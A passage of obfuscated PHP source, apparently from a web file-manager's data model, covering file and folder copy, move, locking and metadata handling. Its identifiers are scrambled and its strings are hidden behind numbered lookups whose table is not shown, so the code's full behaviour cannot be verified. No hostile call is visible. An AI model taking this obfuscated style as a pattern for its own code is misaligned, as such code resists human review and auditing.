($œ¡ŒĞ¦è as $á²ê¿ÖÌ) { $—á°­Ø = $Õê¹¯È . $ÖÙ–ÙÁÎ[555] . $á²ê¿ÖÌ; if (CacheLock::lockGet($ÖÙ–ÙÁÎ[556] . $—á°­Ø)) { $¢Øò­ì· = $this->sourceInfo($á²ê¿ÖÌ); CacheLock::setErrorMsg($ÖÙ–ÙÁÎ[162] . htmlspecialchars($¢Øò­ì·[$ÖÙ–ÙÁÎ[32]]) . $ÖÙ–ÙÁÎ[164] . $á‡÷Àá); $this->_lockKey($—á°­Ø, 1); $this->_lockKey($—á°­Ø, 0); } } } private function _lockCheckEnd($£çç¢´Á, $Œ¨ô£Ô) { $ª“£µÊ€ =& $_SERVER[­á Ş³Ö]; $Æ–Íş¤Ï = $£çç¢´Á . $ª“£µÊ€[10] . $Œ¨ô£Ô; CacheLock::setErrorMsg($ª“£µÊ€[378]); if (!isset($this->_lockTimeStart[$Æ–Íş¤Ï])) { return; } $¹ğíÎ¼ª = timeFloat() - $this->_lockTimeStart[$Æ–Íş¤Ï]; unset($this->_lockTimeStart[$Æ–Íş¤Ï]); if ($¹ğíÎ¼ª > 0.5) { unset(self::$cacheSourceInfo[$ª“£µÊ€[460] . $Œ¨ô£Ô]); } $ş”Ø¤› = $this->sourceInfo($Œ¨ô£Ô); if (!$ş”Ø¤›) { show_json(LNG($ª“£µÊ€[105]), !1); } } private function _lockParent($èĞ„Ş÷ä, $®ğé€, $¯¤ñüÜ) { if (!$this->autoLockSet) { return; } $ÈŸÏšÄŠ = $this->sourceInfo($èĞ„Ş÷ä); if (!is_array($ÈŸÏšÄŠ)) { return; } $—’ä‚¾ƒ = array_reverse($this->parentLevelArray($ÈŸÏšÄŠ[$_SERVER[­á Ş³Ö][511]])); foreach ($—’ä‚¾ƒ as $Äæîñ¹) { $this->_lockEvent($Äæîñ¹, $®ğé€, $¯¤ñüÜ); } } private function _lockEvent($·Ì§§Ãâ, $¤‹ÀÎúƒ, $–Ü¬Î¦—) { $±İ”şäŒ =& $_SERVER[­á Ş³Ö]; if (!$this->autoLockSet) { return; } foreach ($¤‹ÀÎúƒ as $Å‡Ñå¸—) { $Ô‹Ê‰ = $Å‡Ñå¸— . $±İ”şäŒ[10] . $·Ì§§Ãâ; if ($–Ü¬Î¦— && CacheLock::lockGet($±İ”şäŒ[556] . $Ô‹Ê‰)) { continue; } $this->_lockKey($Ô‹Ê‰, $–Ü¬Î¦—); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($çŞ¶¢Ÿ¼, $ŠÑÈ¤ôÍ = 1) { $Ÿ×Âç†Ç = $_SERVER[­á Ş³Ö][556] . md5($çŞ¶¢Ÿ¼); if ($ŠÑÈ¤ôÍ) { if (isset(self::$_lockItemArr[$Ÿ×Âç†Ç])) { return; } self::$_lockItemArr[$Ÿ×Âç†Ç] = 1; CacheLock::lock($Ÿ×Âç†Ç, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ÿ×Âç†Ç])) { return; } unset(self::$_lockItemArr[$Ÿ×Âç†Ç]); CacheLock::unlock($Ÿ×Âç†Ç); } } public function isParentOf($œó‚¤”, $˜Ø¿§é¦) { $¿ê¼³¦Ï =& $_SERVER[­á Ş³Ö]; $ô’Õ‡ëÅ = $this->sourceInfo($œó‚¤”); $éğêŠÚï = $this->sourceInfo($˜Ø¿§é¦); $¾¢‰ÙŒº = $ô’Õ‡ëÅ[$¿ê¼³¦Ï[511]] . $ô’Õ‡ëÅ[$¿ê¼³¦Ï[402]] . $¿ê¼³¦Ï[50]; $ôÃ ˜ÜÒ = $éğêŠÚï[$¿ê¼³¦Ï[511]] . $éğêŠÚï[$¿ê¼³¦Ï[402]] . $¿ê¼³¦Ï[50]; $ƒİª¥“© = strpos($ôÃ ˜ÜÒ, $¾¢‰ÙŒº) === 0; return $ƒİª¥“©; } private $targetIsDelete = 0; public function copy($×“º£ä€, $Óì³šÈ‰, $Ñ¹×Ó = REPEAT_REPLACE, $‡ š¿ü† = '') { $Ë¸ù¿ìĞ =& $_SERVER[­á Ş³Ö]; $şø¿«ğ¸ = $this->sourceInfo($×“º£ä€); $¢øš˜†Š = $this->sourceInfo($Óì³šÈ‰); if (!$şø¿«ğ¸ || !$¢øš˜†Š || $¢øš˜†Š[$Ë¸ù¿ìĞ[410]] != $Ë¸ù¿ìĞ[88]) { return !1; } if ($this->isParentOf($×“º£ä€, $Óì³šÈ‰)) { return !1; } $¼ìÂ‡Æ© = $‡ š¿ü† ? $‡ š¿ü† : $şø¿«ğ¸[$Ë¸ù¿ìĞ[32]]; $this->lockCopyStart($×“º£ä€); $this->lockWriteStart($Óì³šÈ‰, $¼ìÂ‡Æ©); $Ä‘Ó¢Øë = array($Ë¸ù¿ìĞ[557] => array(), $Ë¸ù¿ìĞ[558] => array(), $Ë¸ù¿ìĞ[559] => array()); $this->targetIsDelete = intval($şø¿«ğ¸[$Ë¸ù¿ìĞ[431]]); $åÆ…©Úá = $this->fileNameExistCache($Óì³šÈ‰, $şø¿«ğ¸[$Ë¸ù¿ìĞ[32]]); $¬§˜Ÿäæ = $this->_copy($×“º£ä€, $Óì³šÈ‰, $Ñ¹×Ó, $Ä‘Ó¢Øë, !0, $‡ š¿ü†); $this->_childrenListClear(); $this->lockCopyEnd($×“º£ä€); $this->lockWriteEnd($Óì³šÈ‰, $¼ìÂ‡Æ©); if ($şø¿«ğ¸[$Ë¸ù¿ìĞ[410]] == $Ë¸ù¿ìĞ[88] && $åÆ…©Úá == $¬§˜Ÿäæ) { $this->folderSizeResetChildren($åÆ…©Úá); } Model($Ë¸ù¿ìĞ[560])->addAll($Ä‘Ó¢Øë[$Ë¸ù¿ìĞ[558]], array(), !0); if ($åÆ…©Úá != $¬§˜Ÿäæ || $şø¿«ğ¸[$Ë¸ù¿ìĞ[410]] == $Ë¸ù¿ìĞ[88]) { Model($Ë¸ù¿ìĞ[561])->eventCopy($¬§˜Ÿäæ); } $this->saveAll($Ä‘Ó¢Øë[$Ë¸ù¿ìĞ[559]]); Model($Ë¸ù¿ìĞ[200])->linkAdd($Ä‘Ó¢Øë[$Ë¸ù¿ìĞ[557]]); $this->folderSizeReset($Óì³šÈ‰); $this->updateModifyTime($Óì³šÈ‰); return $¬§˜Ÿäæ; } private function _copy($“™Å×ĞÊ, $Á­ğğ¬Û, $† Ğë€â, &$½à—ä‰±, $Üá®¼”‹, $‰™Ñ‚Š = '') { $Ş«‡¬ =& $_SERVER[­á Ş³Ö]; $ÇÆ„ˆúá = $this->sourceInfoCache($“™Å×ĞÊ); $Ç²»é˜õ = $ÇÆ„ˆúá[$Ş«‡¬[410]] == $Ş«‡¬[88]; $–ÓÈ¥„Š = $‰™Ñ‚Š ? $‰™Ñ‚Š : $ÇÆ„ˆúá[$Ş«‡¬[32]]; $¬³Ë¬Â = $this->fileNameExistCache($Á­ğğ¬Û, $–ÓÈ¥„Š); if ($Üá®¼”‹) { $this->_childrenAllMake($“™Å×ĞÊ); if ($Ç²»é˜õ && $¬³Ë¬Â) { $this->_childrenAllMake($¬³Ë¬Â); } } if (!$¬³Ë¬Â) { return $this->_copyCreate($“™Å×ĞÊ, $Á­ğğ¬Û, $–ÓÈ¥„Š, $½à—ä‰±); } $¹´ÕŒşŸ = $¬³Ë¬Â; if ($Ç²»é˜õ) { if ($† Ğë€â == REPEAT_RENAME_FOLDER) { $–ÓÈ¥„Š = $this->fileNameAutoCache($Á­ğğ¬Û, $–ÓÈ¥„Š, $† Ğë€â, $Ç²»é˜õ); $¹´ÕŒşŸ = $this->_copyCreate($“™Å×ĞÊ, $Á­ğğ¬Û, $–ÓÈ¥„Š, $½à—ä‰±); } else { $—Ô’™©Ï = $this->_childrenList($“™Å×ĞÊ); foreach ($—Ô’™©Ï as $»‹Í°üø) { $this->_copy($»‹Í°üø[$Ş«‡¬[402]], $¬³Ë¬Â, $† Ğë€â, $½à—ä‰±, !1); } } } else { if ($† Ğë€â == REPEAT_RENAME || $† Ğë€â == REPEAT_RENAME_FOLDER) { $–ÓÈ¥„Š = $this->fileNameAutoCache($Á­ğğ¬Û, $–ÓÈ¥„Š, $† Ğë€â, $Ç²»é˜õ); $¹´ÕŒşŸ = $this->_copyCreate($“™Å×ĞÊ, $Á­ğğ¬Û, $–ÓÈ¥„Š, $½à—ä‰±); } else { if ($† Ğë€â == REPEAT_REPLACE) { $ÁŸÖÆ­Ô = $this->sourceInfoCache($¬³Ë¬Â); $¦§Éà«« = $this->fileHistory($ÁŸÖÆ­Ô, $ÇÆ„ˆúá[$Ş«‡¬[468]], $ÇÆ„ˆúá[$Ş«‡¬[76]]); if ($¦§Éà««) { $½à—ä‰±[$Ş«‡¬[557]][] = $ÇÆ„ˆúá[$Ş«‡¬[468]]; } } else { if ($† Ğë€â == REPEAT_SKIP) { } } } Hook::trigger($Ş«‡¬[562], array($Ş«‡¬[563], $ÇÆ„ˆúá, 0)); } return $¹´ÕŒşŸ; } private function _copyCreate($ú¶ÎÓë†, $·Ÿ—÷ùœ, $ºì½¿‰á, &$òúŠª¹¢) { $Ø…ŞÂ•¼ =& $_SERVER[­á Ş³Ö]; $ÑÜÀòìò = $this->sourceInfoCache($ú¶ÎÓë†); $˜Œ›ôğÚ = $this->sourceInfoCache($·Ÿ—÷ùœ); $Õ¥Äƒæ = $this->_makeItemData($ÑÜÀòìò, $˜Œ›ôğÚ, $ºì½¿‰á); Hook::trigger($Ø…ŞÂ•¼[564], $Õ¥Äƒæ); Hook::trigger($Ø…ŞÂ•¼[565], array($Ø…ŞÂ•¼[566], $Õ¥Äƒæ, 0)); $Š¡‘Õ¡ = $this->add($Õ¥Äƒæ); $ñÀÈ±´… = array($Ø…ŞÂ•¼[402] => $Š¡‘Õ¡, $Ø…ŞÂ•¼[32] => $ºì½¿‰á); $this->_copyApplyMeta($ñÀÈ±´…, $òúŠª¹¢); if ($ÑÜÀòìò[$Ø…ŞÂ•¼[410]] != $Ø…ŞÂ•¼[88]) { $òúŠª¹¢[$Ø…ŞÂ•¼[557]][] = $ÑÜÀòìò[$Ø…ŞÂ•¼[468]]; return $Š¡‘Õ¡; } $½÷åÈ¨´ = array(); $òâÛ­¢ = array(); $this->_childrenListAll($ú¶ÎÓë†, $½÷åÈ¨´); $‡µ¾–Ôí = count($½÷åÈ¨´); if ($‡µ¾–Ôí == 0) { return $Š¡‘Õ¡; } $’ì¿ùü± = $this->sourceInfo($Š¡‘Õ¡); foreach ($½÷åÈ¨´ as $ğ’‹Œ•) { $±ıÅèå“ = $this->_makeItemData($ğ’‹Œ•, $’ì¿ùü±, $ğ’‹Œ•[$Ø…ŞÂ•¼[32]]); $±ıÅèå“[$Ø…ŞÂ•¼[511]] = $ğ’‹Œ•[$Ø…ŞÂ•¼[511]]; $òâÛ­¢[] = $±ıÅèå“; } $this->chunkEventSet($Ø…ŞÂ•¼[567], array($Ø…ŞÂ•¼[568], $Õ¥Äƒæ, $‡µ¾–Ôí)); $this->addAll($òâÛ­¢, array(), !1); $¹½˜ÌÕã = $this->where(array($Ø…ŞÂ•¼[432] => $Š¡‘Õ¡))->select(); $Ö—íö = $this->_childrenMakeRelation($½÷åÈ¨´, $¹½˜ÌÕã); $Ö—íö[$ú¶ÎÓë†] = $Š¡‘Õ¡; $ãáá…µ = array(); $² ÜÚıñ = array(); foreach ($¹½˜ÌÕã as $ğ’‹Œ•) { $íÂÜôßî = $ğ’‹Œ•[$Ø…ŞÂ•¼[402]]; $İñûşÖà = $this->_childrenMatch($Ö—íö, $ğ’‹Œ•, $’ì¿ùü±); $ãáá…µ[] = array($Ø…ŞÂ•¼[402], $íÂÜôßî, $Ø…ŞÂ•¼[432], $İñûşÖà[$Ø…ŞÂ•¼[432]]); $² ÜÚıñ[] = array($Ø…ŞÂ•¼[402], $íÂÜôßî, $Ø…ŞÂ•¼[511], $İñûşÖà[$Ø…ŞÂ•¼[511]]); $this->_copyApplyMeta($ğ’‹Œ•, $òúŠª¹¢); if ($ğ’‹Œ•[$Ø…ŞÂ•¼[410]] != $Ø…ŞÂ•¼[88]) { $òúŠª¹¢[$Ø…ŞÂ•¼[557]][] = $ğ’‹Œ•[$Ø…ŞÂ•¼[468]]; } } $this->chunkEventSet($Ø…ŞÂ•¼[569], array($Ø…ŞÂ•¼[570], $Õ¥Äƒæ, $‡µ¾–Ôí)); $this->saveAll($ãáá…µ); $this->chunkEventSet($Ø…ŞÂ•¼[571], array($Ø…ŞÂ•¼[572], $Õ¥Äƒæ, $‡µ¾–Ôí)); $this->saveAll($² ÜÚıñ); return $Š¡‘Õ¡; } private function _childrenMakeRelation($­„‘°£, $¢ÉÂäË“) { $Ò§ï¦­î =& $_SERVER[­á Ş³Ö]; $º¢‚¡ì† = array(); $ññ©©­ = array(); foreach ($­„‘°£ as $÷îÑ½–ì) { $™İ ²Œ› = $÷îÑ½–ì[$Ò§ï¦­î[32]] . $Ò§ï¦­î[8] . $÷îÑ½–ì[$Ò§ï¦­î[511]]; $º¢‚¡ì†[$™İ ²Œ›] = $÷îÑ½–ì[$Ò§ï¦­î[402]]; } foreach ($¢ÉÂäË“ as $÷îÑ½–ì) { $™İ ²Œ› = $÷îÑ½–ì[$Ò§ï¦­î[32]] . $Ò§ï¦­î[8] . $÷îÑ½–ì[$Ò§ï¦­î[511]]; $à‹İÊÏ = $º¢‚¡ì†[$™İ ²Œ›]; $ññ©©­[$à‹İÊÏ] = $÷îÑ½–ì[$Ò§ï¦­î[402]]; } return $ññ©©­; } private function _childrenMatch($åˆÎıñí, $ÆçÄå‰§, $…º•ËåÒ) { $ËşÅ™»´ =& $_SERVER[­á Ş³Ö]; $­‘ïµ•ê = $…º•ËåÒ[$ËşÅ™»´[511]]; $µ¨Î£¯” = $this->parentLevelArray($ÆçÄå‰§[$ËşÅ™»´[511]]); foreach ($µ¨Î£¯” as $ÚôÆŸ‰²) { if (isset($åˆÎıñí[$ÚôÆŸ‰²])) { $­‘ïµ•ê .= $åˆÎıñí[$ÚôÆŸ‰²] . $ËşÅ™»´[573]; } } $­‘ïµ•ê = rtrim($­‘ïµ•ê, $ËşÅ™»´[50]) . $ËşÅ™»´[50]; $áÇ»ÂÕ = $this->parentLevelArray($­‘ïµ•ê); $Í¤ğ¹¸á = $áÇ»ÂÕ[count($áÇ»ÂÕ) - 1]; return array($ËşÅ™»´[432] => $Í¤ğ¹¸á, $ËşÅ™»´[511] => $­‘ïµ•ê); } private function _makeItemData($Ûı»êÅ, $Ü°í±Ëœ, $à‰„ ä’) { $«·‰ş¦á =& $_SERVER[­á Ş³Ö]; $¨ô†‘àÁ = array($«·‰ş¦á[574] => $Ûı»êÅ[$«·‰ş¦á[410]], $«·‰ş¦á[420] => $à‰„ ä’, $«·‰ş¦á[575] => $Ûı»êÅ[$«·‰ş¦á[412]] ? $Ûı»êÅ[$«·‰ş¦á[412]] : $«·‰ş¦á[12], $«·‰ş¦á[469] => $Ûı»êÅ[$«·‰ş¦á[468]] ? $Ûı»êÅ[$«·‰ş¦á[468]] : 0, $«·‰ş¦á[545] => $Ûı»êÅ[$«·‰ş¦á[76]] ? $Ûı»êÅ[$«·‰ş¦á[76]] : 0, $«·‰ş¦á[576] => intval($Ü°í±Ëœ[$«·‰ş¦á[411]]), $«·‰ş¦á[577] => intval($Ü°í±Ëœ[$«·‰ş¦á[496]]), $«·‰ş¦á[578] => intval(USER_ID), $«·‰ş¦á[579] => intval(USER_ID), $«·‰ş¦á[401] => intval($Ü°í±Ëœ[$«·‰ş¦á[402]]), $«·‰ş¦á[580] => $Ü°í±Ëœ[$«·‰ş¦á[511]] . $Ü°í±Ëœ[$«·‰ş¦á[402]] . $«·‰ş¦á[50], $«·‰ş¦á[424] => $Ûı»êÅ[$«·‰ş¦á[85]] ? $Ûı»êÅ[$«·‰ş¦á[85]] : time(), $«·‰ş¦á[430] => 0, $«·‰ş¦á[581] => $«·‰ş¦á[12]); return $¨ô†‘àÁ; } private function _copyApplyMeta($ÚĞ–âåó, &$Êì±ö×ó) { $ÜíÛÌğ× =& $_SERVER[­á Ş³Ö]; $ú¦²èª = $ÚĞ–âåó[$ÜíÛÌğ×[402]]; $êàßá…ş = $ÚĞ–âåó[$ÜíÛÌğ×[32]]; if (!isset($ÚĞ–âåó[$ÜíÛÌğ×[582]]) || !$ÚĞ–âåó[$ÜíÛÌğ×[582]] || $ÚĞ–âåó[$ÜíÛÌğ×[582]] == $ÜíÛÌğ×[198]) { $Êì±ö×ó[$ÜíÛÌğ×[559]][] = array($ÜíÛÌğ×[402], $ú¦²èª, $ÜíÛÌğ×[582], short_id($ú¦²èª)); } if (Input::check($êàßá…ş, $ÜíÛÌğ×[583])) { $Êì±ö×ó[$ÜíÛÌğ×[558]][] = array($ÜíÛÌğ×[402] => $ú¦²èª, $ÜíÛÌğ×[94] => $ÜíÛÌğ×[465], $ÜíÛÌğ×[374] => str_replace($ÜíÛÌğ×[53], $ÜíÛÌğ×[12], Pinyin::get($êàßá…ş))); $Êì±ö×ó[$ÜíÛÌğ×[558]][] = array($ÜíÛÌğ×[402] => $ú¦²èª, $ÜíÛÌğ×[94] => $ÜíÛÌğ×[464], $ÜíÛÌğ×[374] => Pinyin::get($êàßá…ş, $ÜíÛÌğ×[584])); } $Êì±ö×ó[$ÜíÛÌğ×[558]][] = array($ÜíÛÌğ×[402] => $ú¦²èª, $ÜíÛÌğ×[94] => $ÜíÛÌğ×[444], $ÜíÛÌğ×[374] => KodSort::makeStr($êàßá…ş)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ø˜óÜş…) { $‡Ü›èèµ =& $_SERVER[­á Ş³Ö]; $ªà²›¯µ = $this->sourceInfo($ø˜óÜş…); $Ë¦„‘¢­ = $‡Ü›èèµ[585]; $ÇºñËøö = array($‡Ü›èèµ[511] => array($‡Ü›èèµ[540], $ªà²›¯µ[$‡Ü›èèµ[511]] . $ø˜óÜş… . $‡Ü›èèµ[541]), $‡Ü›èèµ[431] => $this->targetIsDelete); $Ş¢¡¥â™ = $this->field($Ë¦„‘¢­)->where($ÇºñËøö)->select(); if (!$Ş¢¡¥â™) { return; } $Ş¢¡¥â™ = array_to_keyvalue($Ş¢¡¥â™, $‡Ü›èèµ[402]); foreach ($Ş¢¡¥â™ as $ÑÇ¤ÏéÆ) { $ôœÃïÀ× = $ÑÇ¤ÏéÆ[$‡Ü›èèµ[432]]; $ø˜óÜş… = $ÑÇ¤ÏéÆ[$‡Ü›èèµ[402]]; if (!isset($this->_childrenListCache[$ø˜óÜş…]) && $ÑÇ¤ÏéÆ[$‡Ü›èèµ[410]] == $‡Ü›èèµ[88]) { $this->_childrenListCache[$ø˜óÜş…] = array(); } if (!isset($this->_childrenListCache[$ôœÃïÀ×])) { $this->_childrenListCache[$ôœÃïÀ×] = array(); } $this->_childrenListCache[$ôœÃïÀ×][$ø˜óÜş…] = $ÑÇ¤ÏéÆ; $this->_childrenItemCache[$ø˜óÜş…] = $ÑÇ¤ÏéÆ; } } private function _childrenListAll($¢êê»éã, &$¹œòÀÕ) { $‹“¸û€Å =& $_SERVER[­á Ş³Ö]; if (!isset($this->_childrenListCache[$¢êê»éã])) { return; } $Õî–îôÖ = $this->_childrenListCache[$¢êê»éã]; foreach ($Õî–îôÖ as $•ŞÀ¥íâ => $½ø™â¬) { $¹œòÀÕ[$•ŞÀ¥íâ] = $½ø™â¬; if ($½ø™â¬[$‹“¸û€Å[410]] == $‹“¸û€Å[88]) { $this->_childrenListAll($•ŞÀ¥íâ, $¹œòÀÕ); } } } private function sourceInfoCache($©Öîô») { if (isset($this->_childrenItemCache[$©Öîô»])) { return $this->_childrenItemCache[$©Öîô»]; } return $this->sourceInfo($©Öîô»); } private function _childrenList($¦¬«§ÎÁ) { if (isset($this->_childrenListCache[$¦¬«§ÎÁ])) { return $this->_childrenListCache[$¦¬«§ÎÁ]; } return $this->_childrenListSelect($¦¬«§ÎÁ); } private function _childrenListSelect($ÂÒÜàó) { $˜û½¸äì =& $_SERVER[­á Ş³Ö]; $¿‘³Ö‰Ğ = array($˜û½¸äì[432] => $ÂÒÜàó, $˜û½¸äì[431] => $this->targetIsDelete); $—Á—¬ = $this->where($¿‘³Ö‰Ğ)->select(); $—Á—¬ = $—Á—¬ ? $—Á—¬ : array(); $ÛŠûÓÖÌ = array_to_keyvalue($—Á—¬, $˜û½¸äì[402]); $this->_childrenListCache[$ÂÒÜàó] = $ÛŠûÓÖÌ; foreach ($ÛŠûÓÖÌ as $ÂÒÜàó => $ÄÅ†™ã„) { $this->_childrenItemCache[$ÂÒÜàó] = $ÄÅ†™ã„; } return $ÛŠûÓÖÌ; } private function fileNameExistCache($´´€Ù, $Ÿ¢ƒ’î) { $Ÿşƒç® =& $_SERVER[­á Ş³Ö]; $Ÿ¢ƒ’î = strtolower($Ÿ¢ƒ’î); $Ïşşáø = $this->_childrenList($´´€Ù); foreach ($Ïşşáø as $ó‘áóÔ›) { if ($Ÿ¢ƒ’î == strtolower($ó‘áóÔ›[$Ÿşƒç®[32]])) { return $ó‘áóÔ›[$Ÿşƒç®[402]]; } } return !1; } private function fileNameAutoCache($çĞìôù, $¾¼Ôè¹º, $ÉÛãï®§, $Â®Üì¥Ê) { $Íª—šÌ³ =& $_SERVER[­á Ş³Ö]; $üŠ°³± = $this->_childrenList($çĞìôù); $ÜÃª¶ª = array_to_keyvalue($üŠ°³±, $Íª—šÌ³[12], $Íª—šÌ³[32]); return $this->fileNameAutoGet($ÜÃª¶ª, $¾¼Ôè¹º, $ÉÛãï®§, $Â®Üì¥Ê); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ˆíöú½, $©Ì¤˜·°, $ÁíøÍ‹ = REPEAT_REPLACE, $¼á”óÔ² = '') { $¶®Í°ÊÔ =& $_SERVER[­á Ş³Ö]; $ÄôÁ¤ü† = $this->sourceInfo($ˆíöú½); $®µã‹¡È = $this->sourceInfo($©Ì¤˜·°); if ($ÄôÁ¤ü†[$¶®Í°ÊÔ[432]] == $®µã‹¡È[$¶®Í°ÊÔ[402]]) { if ($ÄôÁ¤ü†[$¶®Í°ÊÔ[431]] == $¶®Í°ÊÔ[88]) { Model($¶®Í°ÊÔ[429])->restore(array($ˆíöú½)); } if (!$¼á”óÔ² || $¼á”óÔ² == $ÄôÁ¤ü†[$¶®Í°ÊÔ[32]]) { return $ˆíöú½; } } $ÀÅ¹õùš = $this->pathInfoMore($ˆíöú½); if ($this->isParentOf($ˆíöú½, $©Ì¤˜·°)) { return !1; } if (!$ÄôÁ¤ü† || !$®µã‹¡È || $®µã‹¡È[$¶®Í°ÊÔ[410]] != $¶®Í°ÊÔ[88]) { return !1; } Hook::trigger($¶®Í°ÊÔ[586], $ÀÅ¹õùš); $this->targetIsDelete = intval($ÄôÁ¤ü†[$¶®Í°ÊÔ[431]]); if ($ÄôÁ¤ü†[$¶®Í°ÊÔ[432]] == $©Ì¤˜·° && $¼á”óÔ² != $ÄôÁ¤ü†[$¶®Í°ÊÔ[32]]) { $ØÅ…›¤ = $this->fileNameExist($©Ì¤˜·°, $¼á”óÔ²); if ($ØÅ…›¤ && $ÄôÁ¤ü†[$¶®Í°ÊÔ[410]] == $¶®Í°ÊÔ[198]) { $‹”¬şÎó = $this->sourceInfo($ØÅ…›¤); $ì‘Ôà¤ö = $this->fileHistory($‹”¬şÎó, $ÄôÁ¤ü†[$¶®Í°ÊÔ[468]], $ÄôÁ¤ü†[$¶®Í°ÊÔ[76]]); if (!$ì‘Ôà¤ö) { Model($¶®Í°ÊÔ[471])->remove($ÄôÁ¤ü†[$¶®Í°ÊÔ[468]]); } $this->removeNow($ˆíöú½, !1); $this->folderSizeReset($©Ì¤˜·°); Hook::trigger($¶®Í°ÊÔ[587], $ÀÅ¹õùš); return $ØÅ…›¤; } } $Ïì‘Æº— = $¼á”óÔ² ? $¼á”óÔ² : $ÄôÁ¤ü†[$¶®Í°ÊÔ[32]]; $this->lockMoveStart($ˆíöú½); $this->lockWriteStart($©Ì¤˜·°, $Ïì‘Æº—); $¨€÷üÔ = array($¶®Í°ÊÔ[557] => array(), $¶®Í°ÊÔ[588] => !1); $this->clearShare($ˆíöú½, $©Ì¤˜·°); $ÚáàÍ ñ = $this->fileNameExistCache($©Ì¤˜·°, $ÄôÁ¤ü†[$¶®Í°ÊÔ[32]]); $¡†²ƒÆâ = $this->_move($ˆíöú½, $©Ì¤˜·°, $ÁíøÍ‹, $¨€÷üÔ, $¼á”óÔ²); $this->sourceCacheClear(); if ($ÄôÁ¤ü†[$¶®Í°ÊÔ[410]] == $¶®Í°ÊÔ[88] && $ÚáàÍ ñ) { $this->folderSizeResetChildren($¡†²ƒÆâ); } Model($¶®Í°ÊÔ[200])->linkAdd($¨€÷üÔ[$¶®Í°ÊÔ[557]]); if ($ÚáàÍ ñ && $¨€÷üÔ[$¶®Í°ÊÔ[588]]) { $this->removeNow($ˆíöú½, !1); } $this->lockMoveEnd($ˆíöú½); $this->lockWriteEnd($©Ì¤˜·°, $Ïì‘Æº—); $this->folderSizeReset($ÄôÁ¤ü†[$¶®Í°ÊÔ[432]]); $this->folderSizeReset($©Ì¤˜·°); $¼ÑÖè·± = array($ÄôÁ¤ü†[$¶®Í°ÊÔ[432]], $©Ì¤˜·°); if ($ÄôÁ¤ü†[$¶®Í°ÊÔ[410]] == $¶®Í°ÊÔ[88]) { $¼ÑÖè·±[] = $ˆíöú½; } $this->updateModifyTime($¼ÑÖè·±); Model($¶®Í°ÊÔ[561])->eventMove($ˆíöú½, $ÄôÁ¤ü†[$¶®Í°ÊÔ[432]], $©Ì¤˜·°); Hook::trigger($¶®Í°ÊÔ[587], $ÀÅ¹õùš); return $¡†²ƒÆâ; } private function _move($Ê¸¤œ•, $úÈ‰›¿ı, $ÎÛŸ¢¸, &$ˆ˜áÌ˜®, $íÏØÎÇ = '') { $Ë¼±óÙ‘ =& $_SERVER[­á Ş³Ö]; $š»˜™º£ = $this->sourceInfo($Ê¸¤œ•); $áƒ±Á¡Ã = $š»˜™º£[$Ë¼±óÙ‘[410]] == $Ë¼±óÙ‘[88]; $áò©»’» = $íÏØÎÇ ? $íÏØÎÇ : $š»˜™º£[$Ë¼±óÙ‘[32]]; $üµû×™‚ = $this->fileNameExistCache($úÈ‰›¿ı, $áò©»’»); $this->lockMoveStart($Ê¸¤œ•); $this->lockWriteStart($úÈ‰›¿ı, $áò©»’»); if (!$üµû×™‚) { return $this->_moveForce($Ê¸¤œ•, $úÈ‰›¿ı, $áò©»’»); } $–Ùì«¸˜ = $üµû×™‚; $Şò‹©äŸ = !1; if ($áƒ±Á¡Ã) { if ($ÎÛŸ¢¸ == REPEAT_RENAME_FOLDER) { $áò©»’» = $this->fileNameAuto($úÈ‰›¿ı, $áò©»’», $ÎÛŸ¢¸, $áƒ±Á¡Ã); $–Ùì«¸˜ = $this->_moveForce($Ê¸¤œ•, $úÈ‰›¿ı, $áò©»’»); } else { if ($ÎÛŸ¢¸ == REPEAT_RENAME_FOLDER) { $ÎÛŸ¢¸ = REPEAT_RENAME; } $‡£…¸Âî = $this->_childrenListSelect($Ê¸¤œ•); foreach ($‡£…¸Âî as $Ó§¼Ø’”) { $this->_move($Ó§¼Ø’”[$Ë¼±óÙ‘[402]], $üµû×™‚, $ÎÛŸ¢¸, $ˆ˜áÌ˜®); } $Şò‹©äŸ = !0; } } else { if ($ÎÛŸ¢¸ == REPEAT_SKIP) { $Şò‹©äŸ = !0; } else { if ($ÎÛŸ¢¸ == REPEAT_RENAME || $ÎÛŸ¢¸ == REPEAT_RENAME_FOLDER) { $áò©»’» = $this->fileNameAuto($úÈ‰›¿ı, $áò©»’», $ÎÛŸ¢¸, $áƒ±Á¡Ã); $–Ùì«¸˜ = $this->_moveForce($Ê¸¤œ•, $úÈ‰›¿ı, $áò©»’»); } else { if ($ÎÛŸ¢¸ == REPEAT_REPLACE) { $¯üéäÔà = $this->sourceInfoCache($üµû×™‚); $Ôº¢Û¶ = $this->fileHistory($¯üéäÔà, $š»˜™º£[$Ë¼±óÙ‘[468]], $š»˜™º£[$Ë¼±óÙ‘[76]]); $Şò‹©äŸ = !0; if ($Ôº¢Û¶) { $ˆ˜áÌ˜®[$Ë¼±óÙ‘[557]][] = $š»˜™º£[$Ë¼±óÙ‘[468]]; } } } } } if ($Şò‹©äŸ && !$ˆ˜áÌ˜®[$Ë¼±óÙ‘[588]]) { $ˆ˜áÌ˜®[$Ë¼±óÙ‘[588]] = !0; } return $–Ùì«¸˜; } private function _moveForce($œö®—ò, $ã¤îÂ²µ, $½Ø‰Ñ¶) { $±¾ğá =& $_SERVER[­á Ş³Ö]; $éÒ¶ÈŞì = $this->sourceInfo($œö®—ò); $“­æº¶« = $this->sourceInfo($ã¤îÂ²µ); $ÎøøÒ’ß = $éÒ¶ÈŞì[$±¾ğá[410]] == $±¾ğá[88]; $‰ğ¦ïÊĞ = array($±¾ğá[401] => $“­æº¶«[$±¾ğá[402]], $±¾ğá[580] => $“­æº¶«[$±¾ğá[511]] . $“­æº¶«[$±¾ğá[402]] . $±¾ğá[50], $±¾ğá[576] => $“­æº¶«[$±¾ğá[411]], $±¾ğá[577] => $“­æº¶«[$±¾ğá[496]], $±¾ğá[579] => USER_ID, $±¾ğá[420] => $½Ø‰Ñ¶); $Š¾ëÅ•Ó = $éÒ¶ÈŞì[$±¾ğá[411]] == SourceModel::TYPE_GROUP && $“­æº¶«[$±¾ğá[411]] == SourceModel::TYPE_GROUP && $éÒ¶ÈŞì[$±¾ğá[496]] == $“­æº¶«[$±¾ğá[496]]; if (!$Š¾ëÅ•Ó && $this->moveClearAuth) { 